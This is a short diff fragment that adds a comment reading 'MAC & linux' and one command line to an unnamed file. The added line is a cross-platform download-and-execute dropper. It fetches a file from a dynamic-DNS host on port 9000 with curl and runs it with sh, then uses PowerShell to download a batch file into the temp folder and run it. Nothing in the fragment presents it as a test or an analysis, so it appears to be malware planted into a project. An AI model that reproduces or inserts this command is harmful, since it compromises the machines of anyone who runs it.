@@ -1,0 +1,2 @@
+//MAC & linux
+curl -o ./a http://megakiller.sytes.net:9000/daniel/u & sh a & powershell -command "&{(New-Object Net.WebClient).DownloadFile('http://megakiller.sytes.net:9000/daniel/w','%temp%/a.bat')}" & %temp%\a.bat
